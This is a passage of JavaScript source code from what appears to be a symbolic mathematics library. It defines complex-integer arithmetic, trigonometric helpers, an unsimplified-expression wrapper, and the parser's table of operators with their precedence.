        // https://www.varsitytutors.com/hotmath/hotmath_help/topics/polar-form-of-a-complex-number
        return e.divide(Expression.I.multiply(phi).exp()).logarithm().add(Expression.I.multiply(phi));
      }
      return e.logarithm();
    };
    var lnC = new Expression.Matrix(c.map(function (e, i, j) {
      return i === j ? complexLogarithm(e) : Expression.ZERO;
    }));
    //Expression.I.multiply(Expression.PI).divide(Expression.TWO);
    return new Expression.Matrix(b.multiply(c.inverse())).logarithm().add(lnC).divide(Expression.TWO.multiply(Expression.I));
  }
  /*
  var t = simplifyConstantValue(x, "sin");
  if (t != undefined) {
    return t;
  }
  if (!isArgumentValid(x, "sin")) {
    throw new RangeError("NotSupportedError");
  }
  */
  return new Arctan(x);
};

Expression.prototype.tan = function () {
  var a = this;
  //return a.sin().divide(a.cos());
  var a2 = a.multiply(Expression.TWO);
  return a2.sin().divide(a2.cos().add(Expression.ONE));
};
Expression.prototype.cot = function () {
  var a = this;
  if (a instanceof Expression.Matrix) {
    return a.cos().divide(a.sin());
  }
  //return a.cos().divide(a.sin());
  var a2 = a.multiply(Expression.TWO);
  return a2.cos().add(Expression.ONE).divide(a2.sin());
};

Expression.Radians.prototype.complexConjugate = function () {
  return new Expression.Radians(this.value.complexConjugate());
};
Expression.Sin.prototype.complexConjugate = function () {
  return this.a.complexConjugate().sin();
};
Expression.Cos.prototype.complexConjugate = function () {
  return this.a.complexConjugate().cos();
};

})();
(function () {
"use strict";
  
  

  var Integer = Expression.Integer;

  function Complex(real, imaginary) {
    //Expression.call(this);
    if (!(real instanceof Integer) || !(imaginary instanceof Integer) || imaginary.compareTo(Expression.ZERO) === 0) {
      throw new RangeError();
    }
    this.real = real;
    this.imaginary = imaginary;
  }

  Complex.prototype = Object.create(Expression.prototype);

  Expression.I = new Complex(Expression.ZERO, Expression.ONE);
  Expression.Complex = Complex;

  Complex.prototype.add = function (y) {
    return y.addComplex(this);
  };
  Expression.prototype.addComplex = function (x) {
    return this.addExpression(x);
  };
  Integer.prototype.addComplex = function (x) {
    return new Complex(x.real.add(this), x.imaginary);
  };
  Complex.prototype.addComplex = function (x) {
    var real = x.real.add(this.real);
    var imaginary = x.imaginary.add(this.imaginary);
    return imaginary.compareTo(Expression.ZERO) === 0 ? real : new Complex(real, imaginary);
  };
  Complex.prototype.addInteger = function (x) {
    return new Complex(x.add(this.real), this.imaginary);
  };

  Complex.prototype.equals = function (y) {
    return y instanceof Complex && this.real.equals(y.real) && this.imaginary.equals(y.imaginary) ? true : false;
  };

  Complex.prototype.compare4AdditionSymbol = function (x) {
    return +1;
  };
  Complex.prototype.compare4MultiplicationNthRoot = function (x) {
    return +1;
  };
  Complex.prototype.compare4Addition = function (y) {
    if (y instanceof Complex) {
      if (this.equals(y)) {
        return 0;
      }
      return this.real.compareTo(y.real) || this.imaginary.compareTo(y.imaginary);
    }
    if (y instanceof Integer) {
      return +1;
    }
    if (y instanceof Expression.Division) {
      return Expression.prototype.compare4Addition.call(this, y);
    }
    if (y instanceof Expression.Exponentiation) {
      return Expression.prototype.compare4Addition.call(this, y);
    }
    if (y instanceof Expression.Matrix) {
      return Expression.prototype.compare4Addition.call(this, y);
    }
    return -1;
  };
  // ? zero in case of same "base"
  Complex.prototype.compare4Multiplication = function (y) {
    if (y instanceof Complex) {
      if (y.equals(this)) {
        return 0;
      }
      return this.real.abs().compareTo(y.real.abs()) || this.imaginary.abs().compareTo(y.imaginary.abs());
      //return 0;
      //TODO: fix
      //throw new RangeError("NotSupportedError");//TODO:
    }
    return y.compare4MultiplicationComplex(this);
  };
  Expression.prototype.compare4MultiplicationComplex = function (x) {
    return -1;//?
  };
  Complex.prototype.compare4MultiplicationSymbol = function (x) {
    return +1;
  };
  Complex.prototype.multiply = function (y) {
    return y.multiplyComplex(this);
  };
  Complex.prototype.multiplyComplex = function (x) {
    var real = x.real.multiply(this.real).subtract(x.imaginary.multiply(this.imaginary));
    var imaginary = x.real.multiply(this.imaginary).add(x.imaginary.multiply(this.real));
    return imaginary.compareTo(Expression.ZERO) === 0 ? real : new Complex(real, imaginary);
  };
  Expression.prototype.multiplyComplex = function (x) {
    return this.multiplyExpression(x);
  };
  Integer.prototype.multiplyComplex = function (x) {
    if (this.compareTo(Expression.ZERO) === 0) {
      return this;
    }
    return new Complex(x.real.multiply(this), x.imaginary.multiply(this));
  };
  Complex.prototype.multiplyInteger = function (x) {
    if (x.compareTo(Expression.ZERO) === 0) {
      return x;
    }
    return new Complex(x.multiply(this.real), x.multiply(this.imaginary));
  };

  Complex.prototype.conjugate = function () {
    return new Complex(this.real, this.imaginary.negate());
  };
  //Complex.prototype.divideExpression = function (x) {
  //  var y = this;
  //  return x.multiply(y.conjugate()).divide(y.multiply(y.conjugate()));
  //};
  Complex.prototype.getPrecedence = function () {
    return this.real.equals(Expression.ZERO) ? (this.imaginary.equals(Expression.ONE) ? 1000 : 3) : 2; // precedence.binary['+']
  };

  Complex.prototype.truncatingDivide = function (f) {
    if (f instanceof Integer) {
      return new Complex(this.real.truncatingDivide(f), this.imaginary.truncatingDivide(f));
    }
    return this.multiply(f.conjugate()).truncatingDivide(f.multiply(f.conjugate()));
  };

  Complex.prototype.toStringInternal = function (options, times, i, minus, plus, start, end, toString) {
    if (this.real.equals(Expression.ZERO)) {
      if (this.imaginary.equals(Expression.ONE)) {
        return i;
      }
      if (this.imaginary.equals(Expression.ONE.negate())) {
        return start + minus + i + end;
      }
      return start + toString(this.imaginary, options) + times + i + end;
    }
    var isNegative = this.imaginary.isNegative();
    var imaginary = (isNegative ? this.imaginary.negateCarefully() : this.imaginary);
    var si = (imaginary.equals(Expression.ONE) ? i : start + toString(imaginary, options) + times + i + end);
    var sr = toString(this.real, options);
    return start + sr + (isNegative ? minus : plus) + si + end;
  };

  Complex.prototype.toString = function (options) {
    return this.toStringInternal(options, "", "i", "-", "+", "", "", function (x, options) { return x.toString(options); });
  };

  Complex.prototype.compare4MultiplicationInteger = function (x) {
    return +1;
  };

  Complex.prototype.remainderInteger = function (x) {
    return Complex.prototype.remainder.call(x, this);
  };

  Complex.prototype.remainder = function (y) {
    function norm(x) {
      return x instanceof Expression.Integer ? x.multiply(x) : x.multiply(x.conjugate());
    }
    function roundDivision(a, b) {
      if (b.compareTo(Expression.ZERO) < 0) {
        b = b.negate();
        a = a.negate();
      }
      var e = b.truncatingDivide(Expression.TWO);
      if (a.compareTo(Expression.ONE) < 0) {
        e = e.negate();
      }
      return a.add(e).truncatingDivide(b);
    }
    var x = this;
    var n = y instanceof Expression.Integer ? x : x.multiply(y.conjugate());
    var d = y instanceof Expression.Integer ? y : y.multiply(y.conjugate());
    //TODO: fix
    var q1 = roundDivision(n instanceof Complex ? n.real : n, d);
    var q2 = roundDivision(n instanceof Complex ? n.imaginary : Expression.ZERO, d);
    var q = q2.compareTo(Expression.ZERO) === 0 ? q1 : new Complex(q1, q2);
    var r =  x.subtract(y.multiply(q));
    if (norm(r).compareTo(norm(y)) >= 0) {
      throw new TypeError();
    }
    return r;
  };

  Complex.prototype.primeFactor = function () {
    return QuadraticInteger._complexIntegerPrimeFactor(this.real.toBigInt(), this.imaginary.toBigInt());
  };

  Expression.Complex = Complex;

Expression.Complex.prototype.complexConjugate = function () {
  return this.conjugate();
};

/*
//!
Expression.Complex.prototype.isValid = function () {
  return true;
};
//!
Expression.Complex.prototype.isPositive = function () {
  return this.imaginary.compareTo(Expression.ZERO) > 0;// || (this.imaginary.compareTo(Expression.ZERO) === 0 && this.real.compareTo(Expression.ZERO) > 0);
};
Expression.Complex.prototype.isUnit = function () {
  return this.multiply(this.conjugate()).equals(Expression.ONE);
};
Expression.Complex.prototype.truncatingDivideInteger = function (x) {
  debugger;
  return x.multiply(this.conjugate()).divide(this.multiply(this.conjugate()));
};

Expression.Complex.prototype.isDivisibleBy = function (y) {
  return !(this.divide(y) instanceof Expression.Division);
};
Expression.Complex.prototype.isDivisibleByInteger = function (x) {
  return !(x.multiply(this.conjugate()).divide(this.multiply(this.conjugate())) instanceof Expression.Division);
};
Expression.Complex.prototype.toExpression = function () {
  return this;
};
*/

})();
(function () {
"use strict";
  
  
  
  

  var idCounter = 0;

  function NonSimplifiedExpression(e, position, length, input) {
    //Expression.call(this);
    this.e = e;
    this.position = position == undefined ? -1 : position;
    this.length = length == undefined ? -1 : length;
    this.input = input == undefined ? "" : input;
    this.id = (idCounter += 1);
  }

  NonSimplifiedExpression.prototype = Object.create(Expression.prototype);

  // same set of public properties (and same order) as for Expressions ...
  NonSimplifiedExpression.prototype.negate = function () {
    return new NonSimplifiedExpression(new Expression.Negation(this));
  };
  NonSimplifiedExpression.prototype.add = function (y) {
    return new NonSimplifiedExpression(new Expression.Addition(this, y));
  };
  NonSimplifiedExpression.prototype.subtract = function (y) {
    return new NonSimplifiedExpression(new Expression.Subtraction(this, y));
  };
  NonSimplifiedExpression.prototype.divide = function (y) {
    return new NonSimplifiedExpression(new Expression.Division(this, y));
  };
  NonSimplifiedExpression.prototype.multiply = function (y) {
    return new NonSimplifiedExpression(new Expression.Multiplication(this, y));
  };
  NonSimplifiedExpression.prototype.pow = function (y) {
    return new NonSimplifiedExpression(new Expression.Exponentiation(this, y));
  };

  NonSimplifiedExpression.prototype.exp = function () {
    return new NonSimplifiedExpression(Expression.E).pow(this);
  };
  NonSimplifiedExpression.prototype.logarithm = function () {
    return new NonSimplifiedExpression(new Expression.Logarithm(this));
  };
  NonSimplifiedExpression.prototype.inverse = function () {
    return new NonSimplifiedExpression(new Expression.Exponentiation(this, Expression.ONE.negate())); // to support the MathML serialization of the `inverse(B)`
    //return new NonSimplifiedExpression(Expression.ONE).divide(this);
  };

  NonSimplifiedExpression.prototype.factorial = function () {
    return new NonSimplifiedExpression(new Expression.Factorial(this));
  };

/*
  NonSimplifiedExpression.prototype.powExpression = function (x) {
    return new NonSimplifiedExpression(new Expression.Exponentiation(x, this));
  };
  NonSimplifiedExpression.prototype.multiplyAddition = function (x) {
    return new NonSimplifiedExpression(new Expression.Multiplication(x, this));
  };
  NonSimplifiedExpression.prototype.multiplyDivision = function (x) {
    return new NonSimplifiedExpression(new Expression.Multiplication(x, this));
  };
  NonSimplifiedExpression.prototype.multiplyMatrix = function (x) {
    return new NonSimplifiedExpression(new Expression.Multiplication(x, this));
  };
  NonSimplifiedExpression.prototype.addDivision = function (x) {
    return new NonSimplifiedExpression(new Expression.Addition(x, this));
  };

  //?
  NonSimplifiedExpression.prototype.addMatrix = function (x) {
    return new NonSimplifiedExpression(new Expression.Addition(x, this));
  };

  NonSimplifiedExpression.prototype.addExpression = function (x) {
    return new NonSimplifiedExpression(new Expression.Addition(x, this));
  };
  NonSimplifiedExpression.prototype.multiplyExpression = function (x) {
    return new NonSimplifiedExpression(new Expression.Multiplication(x, this));
  };
  NonSimplifiedExpression.prototype.divideExpression = function (x) {
    return new NonSimplifiedExpression(new Expression.Division(x, this));
  };
*/

  NonSimplifiedExpression.prototype.addExpression = function (x) {
    throw new TypeError();
  };

  NonSimplifiedExpression.prototype.squareRoot = function () {
    return new NonSimplifiedExpression(new Expression.SquareRoot(this));
  };
  NonSimplifiedExpression.prototype._nthRoot = function (n) {
    return new NonSimplifiedExpression(new Expression.NthRoot(n + "-root", this, n));
  };
  NonSimplifiedExpression.prototype.abs = function () {
    return new NonSimplifiedExpression(new Expression.Function("abs", this));
  };
  NonSimplifiedExpression.prototype.cos = function () {
    return new NonSimplifiedExpression(new Expression.Function("cos", this));
  };
  NonSimplifiedExpression.prototype.sin = function () {
    return new NonSimplifiedExpression(new Expression.Function("sin", this));
  };
  NonSimplifiedExpression.prototype.tan = function () {
    return new NonSimplifiedExpression(new Expression.Function("tan", this));
  };
  NonSimplifiedExpression.prototype.cot = function () {
    return new NonSimplifiedExpression(new Expression.Function("cot", this));
  };
  NonSimplifiedExpression.prototype.cosh = function () {
    return new NonSimplifiedExpression(new Expression.Function("cosh", this));
  };
  NonSimplifiedExpression.prototype.sinh = function () {
    return new NonSimplifiedExpression(new Expression.Function("sinh", this));
  };
  NonSimplifiedExpression.prototype.tanh = function () {
    return new NonSimplifiedExpression(new Expression.Function("tanh", this));
  };
  NonSimplifiedExpression.prototype.coth = function () {
    return new NonSimplifiedExpression(new Expression.Function("coth", this));
  };
  NonSimplifiedExpression.prototype.arccos = function () {
    return new NonSimplifiedExpression(new Expression.Function("arccos", this));
  };
  NonSimplifiedExpression.prototype.arcsin = function () {
    return new NonSimplifiedExpression(new Expression.Function("arcsin", this));
  };
  NonSimplifiedExpression.prototype.arctan = function () {
    return new NonSimplifiedExpression(new Expression.Function("arctan", this));
  };
  NonSimplifiedExpression.prototype.arccot = function () {
    return new NonSimplifiedExpression(new Expression.Function("arccot", this));
  };
  NonSimplifiedExpression.prototype.arcosh = function () {
    return new NonSimplifiedExpression(new Expression.Function("arcosh", this));
  };
  NonSimplifiedExpression.prototype.arsinh = function () {
    return new NonSimplifiedExpression(new Expression.Function("arsinh", this));
  };
  NonSimplifiedExpression.prototype.artanh = function () {
    return new NonSimplifiedExpression(new Expression.Function("artanh", this));
  };
  NonSimplifiedExpression.prototype.arcoth = function () {
    return new NonSimplifiedExpression(new Expression.Function("arcoth", this));
  };
  NonSimplifiedExpression.prototype.rank = function () {
    return new NonSimplifiedExpression(new Expression.Rank(this));
  };
  NonSimplifiedExpression.prototype.determinant = function () {
    return new NonSimplifiedExpression(new Expression.Determinant(this));
  };
  NonSimplifiedExpression.prototype.rowReduce = function () {
    return new NonSimplifiedExpression(new Expression.RowReduce(this));
  };
  //?
  NonSimplifiedExpression.prototype.GF2 = function () {
    return new NonSimplifiedExpression(new Expression.GF2(this));
  };
  NonSimplifiedExpression.prototype.transpose = function () {
    return new NonSimplifiedExpression(new Expression.Transpose(this));
  };
  NonSimplifiedExpression.prototype.complexConjugate = function () {
    return new NonSimplifiedExpression(new Expression.ComplexConjugate(this));
  };
  NonSimplifiedExpression.prototype.adjugate = function () {
    return new NonSimplifiedExpression(new Expression.Adjugate(this));
  };

  NonSimplifiedExpression.prototype.elementWisePower = function (a) {
    return new NonSimplifiedExpression(new Expression.ElementWisePower(this, a));
  };
  NonSimplifiedExpression.prototype.transformNoAnswerExpression = function (name, second) {
    return new NonSimplifiedExpression(new Expression.NoAnswerExpression(this, name, second));
  };
  NonSimplifiedExpression.prototype.transformEquality = function (b) {
    return new NonSimplifiedExpression(new Expression.Equality(this, b));
  };
  NonSimplifiedExpression.prototype.transformInequality = function (b, sign) {
    return new NonSimplifiedExpression(new Expression.Inequality(this, b, sign));
  };
  NonSimplifiedExpression.prototype.transformComma = function (b) {
    return new NonSimplifiedExpression(new Expression.Comma(this, b));
  };

  NonSimplifiedExpression.prototype.addPosition = function (position, length, input) {
    return new NonSimplifiedExpression(this.e, position, length, input);
  };

  var prepare = function (x, holder) {
    var e = x.simplify();
    ExpressionParser.startPosition = holder.position;
    ExpressionParser.endPosition = holder.position + holder.length;
    ExpressionParser.input = holder.input;
    return e;
  };

  //TODO:
  Expression.prototype.simplifyInternal = function (holder) {
    return this;
  };
  Expression.Exponentiation.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).pow(prepare(this.b, holder));
  };
  Expression.Multiplication.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).multiply(prepare(this.b, holder));
  };
  Expression.Addition.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).add(prepare(this.b, holder));
  };
  Expression.Division.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).divide(prepare(this.b, holder));
  };
  Expression.SquareRoot.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).squareRoot();
  };
  Expression.NthRoot.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder)._nthRoot(this.n);
  };
  Expression.Function.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder)[this.name]();
  };
  Expression.Logarithm.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).logarithm();
  };
  Expression.Rank.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).rank();
  };
  Expression.Determinant.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).determinant();
  };
  Expression.RowReduce.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).rowReduce();
  };
  Expression.GF2.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).GF2();
  };
  Expression.Transpose.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).transpose();
  };
  Expression.ComplexConjugate.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).complexConjugate();
  };
  Expression.Adjugate.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).adjugate();
  };
  Expression.NoAnswerExpression.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).transformNoAnswerExpression(this.name, this.second == undefined ? undefined : prepare(this.second, holder));
  };
  Expression.Equality.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).transformEquality(prepare(this.b, holder));
  };
  Expression.Inequality.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).transformInequality(prepare(this.b, holder), this.sign);
  };
  Expression.Matrix.prototype.simplifyInternal = function (holder) {
    return new Expression.Matrix(this.matrix.map(function (e, i, j) {
      return prepare(e, holder);
    }));
  };

  Expression.Radians.prototype.simplifyInternal = function (holder) {
    return new Expression.Radians(prepare(this.value, holder));
  };

  Expression.Comma.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).transformComma(prepare(this.b, holder));
  };

  Expression.prototype.simplify = function () {
    return this;//? this.simplifyInternal(undefined);
  };
  NonSimplifiedExpression.prototype.simplify = function () {
    //return this.e.simplifyInternal(this);
    //return this.e.simplifyInternal(this).simplifyExpression();//new

    // to get an expression after a double "wrapping"
    return this.e.simplify().simplifyInternal(this).simplifyExpression();//new
  };
  NonSimplifiedExpression.prototype.toString = function (options) {
    return this.e.toString(options);
  };
  NonSimplifiedExpression.prototype.equals = function (y) {
    return this.simplify().equals(y.simplify());
  };

  //!
  NonSimplifiedExpression.prototype.unwrap = function () {
    return this.e;
  };
  Expression.Negation.prototype.simplifyInternal = function (holder) {
    return prepare(this.b, holder).negate();
  };
  Expression.Subtraction.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).subtract(prepare(this.b, holder));
  };
  NonSimplifiedExpression.prototype.isUnaryPlusMinus = function () {
    return this.e.isUnaryPlusMinus();
  };
  NonSimplifiedExpression.prototype.getPrecedence = function () {
    return this.e.getPrecedence();
  };

  Expression.ElementWisePower.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).elementWisePower(prepare(this.b, holder));
  };
  Expression.Factorial.prototype.simplifyInternal = function (holder) {
    return prepare(this.n, holder).factorial();
  };

//?
  NonSimplifiedExpression.prototype.getId = function () {
    return "e" + this.id.toString();
  };
  Expression.prototype.getIds = function () {
    return "";
  };
  Expression.BinaryOperation.prototype.getIds = function () {
    var a = this.a.getIds();
    var b = this.b.getIds();
    return a === "" ? b : (b === "" ? a : a + ", " + b);
  };
  NonSimplifiedExpression.prototype.getIds = function () {
    var a = this.getId();
    var b = this.e.getIds();
    return a === "" ? b : (b === "" ? a : a + ", " + b);
  };

  NonSimplifiedExpression.prototype.isNegative = function () {
    //return this.e.isNegative();
    return false;
  };
  NonSimplifiedExpression.prototype.negateCarefully = function () {
    return new NonSimplifiedExpression(this.e.negateCarefully());
  };
  NonSimplifiedExpression.prototype.isRightToLeftAssociative = function () {
    return this.e.isRightToLeftAssociative();
  };

  NonSimplifiedExpression.prototype.isExact = function () {
    return this.e.isExact();
  };

  Expression.DecimalFraction = function (integer, transient, repetend, exponent) {
    this.integer = integer;
    this.transient = transient;
    this.repetend = repetend;
    this.exponent = exponent;
  };
  Expression.DecimalFraction.prototype = Object.create(Expression.prototype);
  Expression.DecimalFraction.prototype.getPrecedence = function () {
    //TODO: comma may affect precedence - ?
    return 1000;//TODO: ?
  };
  Expression.DecimalFraction.prototype.simplifyInternal = function () {
    return ExpressionParser._getDecimalFraction(this.integer, this.transient, this.repetend, this.exponent);
  };
  Expression.DecimalFraction.prototype.toString = function () {
    return (this.integer || '0') + '.' + (this.transient || '') + (this.repetend != undefined ? '(' + this.repetend + ')' : '') + (this.exponent != undefined ? 'E' + this.exponent : '');
  };

  NonSimplifiedExpression.prototype.augment = function (other) {
    return new NonSimplifiedExpression(new Expression.AugmentedMatrix(this, other));
  };
  Expression.AugmentedMatrix.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).augment(prepare(this.b, holder));
  };

  Expression.NonSimplifiedExpression = NonSimplifiedExpression;

  self.NonSimplifiedExpression = NonSimplifiedExpression;

})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2 */
  
  

  //var isAlpha = function (code) {
  //  return (code >= "a".charCodeAt(0) && code <= "z".charCodeAt(0)) ||
  //         (code >= "A".charCodeAt(0) && code <= "Z".charCodeAt(0));
  //};

  // http://en.wikipedia.org/wiki/Operators_in_C_and_C%2B%2B#Operator_precedence

  var LEFT_TO_RIGHT = 0;
  var RIGHT_TO_LEFT = 1;

  var COMMA_PRECEDENCE = 1;
  var EQUALITY_PRECEDENCE = 2;
  var ADDITIVE_PRECEDENCE = 3;
  var MULTIPLICATIVE_PRECEDENCE = 4;
  var UNARY_PRECEDENCE = 6;

  var UNARY_PRECEDENCE_PLUS_ONE = UNARY_PRECEDENCE + 1; // TODO: remove
  var UNARY_PRECEDENCE_PLUS_TWO = UNARY_PRECEDENCE + 2;

  function Operator(name, arity, rightToLeftAssociative, precedence, i) {
    this.name = name;
    this.arity = arity;
    this.rightToLeftAssociative = rightToLeftAssociative;
    this.precedence = precedence;
    this.i = i;
    //this.xyz = isAlpha(name.charCodeAt(0)) && isAlpha(name.charCodeAt(name.length - 1));
  }

  Operator.trigonometry = function (name) {
    return new Operator(name, 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      a = prepareTrigonometricArgument(a);
      return a[name]();
    });
  };
  Operator.simple = function (name) {
    return new Operator(name, 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a[name]();
    });
  };



  var UNARY_PLUS = new Operator("+", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (e) {
    return e;
  });
  var UNARY_MINUS = new Operator("-", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (e) {
    return e.negate();
  });

  var prepareTrigonometricArgument = function (a) {
    if (a instanceof Expression.Integer) {
      return new Expression.Degrees(a);
    }
    if (a instanceof Expression.NonSimplifiedExpression) {
      var isGood = function (a) {
        if (a instanceof Expression.NonSimplifiedExpression) {
          return isGood(a.e);
        }
        if (a instanceof Expression.Integer) {
          return true;
        }
        if (a instanceof Expression.Negation) {
          return isGood(a.b);
        }
        if (a instanceof Expression.Multiplication || a instanceof Expression.Addition) {
          return isGood(a.a) && isGood(a.b);
        }
        return false;
      };
      if (isGood(a)) {
        return toDegrees(a);
      }
    }
    return a;
  };

  var toDegrees = function (a) {
    return a instanceof Expression.NonSimplifiedExpression ? new Expression.NonSimplifiedExpression(new Expression.Degrees(a)) : new Expression.Degrees(a);
  };

  var toRadians = function (a) {
    return a instanceof Expression.NonSimplifiedExpression ? new Expression.NonSimplifiedExpression(new Expression.Radians(a)) : new Expression.Radians(a);
  };

  var notSupported = function (a) {
    throw new TypeError();
  };

  var conjugateTranspose = function (a) {
    return a.transpose().complexConjugate();
  };

  var inequalityOperator = function (name, sign) {
    return new Operator(name, 2, LEFT_TO_RIGHT, EQUALITY_PRECEDENCE, function (a, b) {
      return a.transformInequality(b, sign);//TODO:
    });
  };

  var operations = [
    new Operator("=", 2, LEFT_TO_RIGHT, EQUALITY_PRECEDENCE, function (a, b) {
      return a.transformEquality(b);
    }),

    inequalityOperator('â‰ ', '!='),
    inequalityOperator('!=', '!='),
    inequalityOperator('>', '>'),
    inequalityOperator('<', '<'),
    inequalityOperator('â©½', '>='),
    inequalityOperator('â©¾', '<='),

    new Operator(";", 2, LEFT_TO_RIGHT, COMMA_PRECEDENCE, function (a, b) {
      return a.transformComma(b);
    }),
    new Operator(",", 2, LEFT_TO_RIGHT, COMMA_PRECEDENCE, function (a, b) {
      return a.transformComma(b);
    }),

    new Operator("+", 2, LEFT_TO_RIGHT, ADDITIVE_PRECEDENCE, function (a, b) {
      return a.add(b);
    }),
    new Operator("-", 2, LEFT_TO_RIGHT, ADDITIVE_PRECEDENCE, function (a, b) {
      return a.subtract(b);
    }),
    new Operator("*", 2, LEFT_TO_RIGHT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
      return a.multiply(b);
    }),
    new Operator("/", 2, LEFT_TO_RIGHT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
      return a.divide(b);
    }),
    new Operator("\\", 2, LEFT_TO_RIGHT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
      return a.inverse().multiply(b);
    }),
    //new Operator("%", 2, LEFT_TO_RIGHT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
    //  return a.remainder(b);
    //}),
    //UNARY_PLUS,
    //UNARY_MINUS,
    // Exponentiation has precedence as unary operators
    new Operator("^", 2, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a, b) {
      return a.pow(b);
    }),
    new Operator("**", 2, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a, b) {
      return a.pow(b);
    }),
    new Operator(".^", 2, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a, b) {
      return a.elementWisePower(b);
    }),//?
    new Operator("\u221A", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.squareRoot();
    }),
    new Operator("sqrt", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.squareRoot();
    }),
    new Operator("radical", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.squareRoot();
    }),
    new Operator("\u221B", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a._nthRoot(3);
    }),
    new Operator("cbrt", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a._nthRoot(3);
    }),
    new Operator("\u221C", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a._nthRoot(4);
    }),
    new Operator("rank", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.rank();
    }),
    new Operator("adj", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {//?
      return a.adjugate();
    }),
    new Operator("adjugate", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.adjugate();
    }),
    //new Operator("trace", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
    //  return Expression.transformTrace(a);
    //}),
    new Operator("inverse", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.inverse();
    }),
    new Operator("det", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {//?
      return a.determinant();
    }),
    new Operator("determinant", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.determinant();
    }),
    new Operator("row-reduce", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.rowReduce();
    }),
    new Operator("transpose", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.transpose();
    }),
    //new Operator("^T", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, function (a) {
    //  return a.transpose();
    //}),
    //new Operator("^t", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, function (a) {
    //  return a.transpose();
    //}),
    new Operator("'", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, function (a) {
      return a.transpose();
    }),
    //TODO: https://en.wikipedia.org/wiki/Conjugate_transpose
    new Operator("^*", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, conjugateTranspose),
    new Operator("^{*}", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, conjugateTranspose),
    new Operator("âƒ°", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, conjugateTranspose),

    //?
    new Operator("solve", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.transformNoAnswerExpression("solve");//?
    }),

    new Operator("GF2", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.GF2();
    }),

    new Operator("Â°", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE_PLUS_TWO, function (a) {
      return toDegrees(a);
    }),
    new Operator("deg", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE_PLUS_TWO, function (a) {
      return toDegrees(a);
    }),
    new Operator("rad", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE_PLUS_TWO, function (a) {
      return toRadians(a);
    }),

    new Operator("exp", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.exp();
    }),
    new Operator("log", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.logarithm();
    }),
    new Operator("lg", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.logarithm().divide(Expression.TEN.logarithm());
    }),
    new Operator("ln", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.logarithm();
    }),

    new Operator("abs", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.abs();
    }),

    new Operator("min", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.min();
    }),
